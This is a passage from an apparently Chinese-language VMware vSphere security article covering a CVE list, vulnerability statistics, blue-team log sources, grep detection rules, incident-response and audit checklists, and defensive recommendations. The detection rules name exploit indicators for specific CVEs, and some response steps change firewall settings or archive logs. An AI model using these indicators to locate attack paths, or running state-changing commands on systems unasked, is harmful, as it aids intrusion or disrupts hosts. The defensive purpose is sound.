│ CVE-2022-31696│ vCenter XLT 注入  │ 7.5      │ 注入       │ -                                 │
│ CVE-2022-31699│ vCenter SSRF      │ 7.5      │ SSRF       │ -                                 │
│ CVE-2023-20887│ vRNI 命令注入     │ 9.8      │ 命令注入   │ 2023-06                           │
│ CVE-2023-34048│ vCenter OOB Write │ 9.8      │ 越界写入   │ 2023-10                           │
│ CVE-2024-22252│ ESXi USB TOCTOU   │ 9.3      │ 竞争条件   │ 2024-06                           │
│ CVE-2024-37085│ ESXi AD 绕过      │ 6.8      │ 认证绕过   │ 2024-08                           │
└──────────────┴────────────────────┴──────────┴────────────┴───────────────────────────────────┘
```

### 9.2 漏洞类型分布

```
VMware CVE 分类统计 (2020-2025):

  远程代码执行 (RCE)        ████████████████████████████  45%
  SSRF/路径穿越             ██████████████               23%
  认证绕过                   ████████                     13%
  堆溢出/内存破坏            ██████                       10%
  信息泄露                   ██████                        9%
```

## 0x10 蓝队检测与应急响应

### 10.1 关键日志源

```bash
# vCenter Server (VCSA) 日志
/var/log/vmware/vsphere-ui/vsphere_ui_virgo.log          # vSphere Client
/var/log/vmware/vpxd/vpxd.log                            # vCenter 主服务
/var/log/vmware/rhttpproxy/rhttpproxy.log                # HTTP 反向代理
/var/log/vmware/vapi/vapi.log                            # REST API
/var/log/vmware/sso/vmware-sts-idmd.log                  # SSO/STS
/var/log/vmware/analytics/analytics.log                  # CEIP analytics
/var/log/vmware/vsan-health/vsanhealth.log               # vSAN

# ESXi 主机日志
/var/log/hostd.log                                        # Host daemon
/var/log/shell.log                                        # Shell 访问
/var/log/auth.log                                         # 认证日志
/var/log/vobd.log                                         # VMkernel
/var/log/vpxa.log                                         # vCenter agent
/var/log/syslog.log                                       # 系统日志
```

### 10.2 威胁检测规则

```bash
# 检测 CVE-2021-21972 vROps 文件上传
grep -E "uploadova|vropspluginui|majestic-ostrich" /var/log/vmware/rhttpproxy/rhttpproxy.log

# 检测 CVE-2021-22005 CEIP 异常请求
grep -E "analytics.*telemetry.*ph/api" /var/log/vmware/rhttpproxy/rhttpproxy.log

# 检测 CVE-2022-22954 SSTI 攻击
grep -E "deviceUdid|deviceType|freemarker|Execute" /var/log/vmware/rhttpproxy/rhttpproxy.log

# 检测 MOB 未授权访问
grep -E "mob.*login\|managed.*object.*browser" /var/log/vmware/rhttpproxy/rhttpproxy.log

# 检测 ESXi 异常登录
grep -E "Accepted|Failed" /var/log/auth.log | tail -50

# 检测异常 SSH 连接
grep "sshd" /var/log/auth.log | grep -v "pam_unix"

# 检测虚拟机异常操作 (关机/快照/导出)
grep -E "PowerOffVM_Task\|CreateSnapshot_Task\|ExportVApp" /var/log/vpxd/vpxd.log

# 检测 SAML 认证异常
grep -E "SAML\|STS\|sso" /var/log/vmware/sso/vmware-sts-idmd.log | grep -i "error\|fail"
```

### 10.3 应急响应清单

```bash
echo "=== VMware vSphere 应急响应清单 ==="

echo "[1] 隔离受感染主机"
# 保留 SSH 访问，阻断其他所有网络
# ESXi 防火墙
esxcli network firewall set --enabled=true
# vCenter — 通过 VCSA Shell 防火墙规则

echo "[2] 保护证据"
# 导出关键日志
tar czf /tmp/vcenter-logs-$(date +%Y%m%d).tar.gz /var/log/vmware/
# ESXi 日志
cp -r /var/log/ /tmp/esxi-logs-$(date +%Y%m%d)/

echo "[3] 检查入侵指标"
# 检查异常文件
find / -name "*.jsp" -mtime -7 2>/dev/null
find / -name "*.war" -mtime -7 2>/dev/null
find /tmp -type f -mtime -3 2>/dev/null

# 检查异常进程
ps -c | grep -v "\[" | head -30

# 检查异常 crontab
cat /var/spool/cron/crontabs/root

echo "[4] 重置凭据"
# 重置 vCenter SSO 管理员密码
# 重置 ESXi root 密码
# 轮换 vCenter → ESXi service account
# 重新生成 SAML 签名证书

echo "[5] 补丁与加固"
# 应用最新安全补丁
# 关闭不必要的服务 (OpenSLP, MOB)
# 配置网络分段隔离管理面
```

## 0x11 安全审计清单

### vCenter Server 审计

```bash
# 版本与补丁状态
echo "=== vCenter 审计清单 ==="

echo "[1] 版本检查"
/usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost
cat /etc/vmware-vpx/vcdb.properties 2>/dev/null | head -5
vpxd -v 2>/dev/null

echo "[2] 端口暴露检查"
ss -tlnp | grep -E "443|902|8080|8443|5480"

echo "[3] 服务状态检查"
systemctl status vmware-vpxd
systemctl status vmware-stsd
systemctl status vmware-rhttpproxy

echo "[4] 用户与权限检查"
/usr/lib/vmware-vmafd/bin/dir-cli user list --login administrator@vsphere.local

echo "[5] SSL 证书检查"
openssl s_client -connect localhost:443 -servername vcenter < /dev/null 2>/dev/null | openssl x509 -noout -subject -dates

echo "[6] CEIP 状态检查"
# 确保 CEIP 已禁用或补丁已更新
/usr/lib/vmware-ceip/vmware-ceip --status

echo "[7] 备份状态检查"
# 确认 VCSA 备份正常
/usr/lib/vmware-vpostgres/bin/pg_dump VCDB > /dev/null 2>&1 && echo "DB OK" || echo "DB Error"
```

### ESXi 主机审计

```bash
echo "=== ESXi 审计清单 ==="

echo "[1] 版本与构建号"
vmware -v
esxcli system version get

echo "[2] 服务暴露检查"
esxcli network ip connection list | grep -E "LISTEN" | sort

echo "[3] OpenSLP 状态"
esxcli network firewall ruleset list | grep -i slp
/etc/init.d/slpd status

echo "[4] SSH 与 Shell 访问"
vim-cmd hostsvc/host_summary | grep sshEnabled
esxcli system ssh server get

echo "[5] AD 集成状态"
esxcli system account list
vicfg-authconfig --server localhost --query

echo "[6] 防火墙规则"
esxcli network firewall ruleset list

echo "[7] 证书检查"
openssl s_client -connect localhost:443 < /dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates

echo "[8] 虚拟机快照检查"
vim-cmd vmsvc/getallvms | while read vmid rest; do
    vim-cmd vmsvc/snapshot.get $vmid 2>/dev/null
done
```

## 0x12 总结

VMware vSphere/ESXi/vCenter 平台作为企业虚拟化的核心基础设施，其安全问题的影响远超单个服务器——攻击者一旦攻破 vCenter，即可横向控制整个虚拟化环境中的所有虚拟机、存储和网络资源。

**关键防御策略**:

1. **补丁管理**: 将 VMware 安全公告纳入高优先级补丁流程，vCenter 和 ESXi 补丁应在公告发布后 72 小时内评估并部署
2. **网络分段**: 严格隔离管理面网络（vCenter/ESXi 管理接口），仅允许堡垒机和管理站访问
3. **服务最小化**: 关闭不必要的服务（OpenSLP、MOB、SSH、CIM），减少攻击面
4. **凭据安全**: 禁用默认账户、强制 MFA、定期轮换服务账号密码
5. **日志监控**: 集中收集 vCenter 和 ESXi 日志，配置异常行为告警（文件上传、MOB 访问、异常登录）
6. **备份策略**: 实施 3-2-1 备份策略，定期验证备份可恢复性，确保备份与生产环境网络隔离
7. **应急响应**: 建立虚拟化平台专项应急响应预案，定期进行红蓝对抗演练

随着 2023 年 Broadcom 收购 VMware，产品授权模式发生重大变化，但存量部署的 vSphere 基础设施仍是攻击者的核心目标。蓝队应持续关注 VMware 安全公告，将上述漏洞检测规则集成到 SIEM/SOAR 平台，并定期进行安全审计。
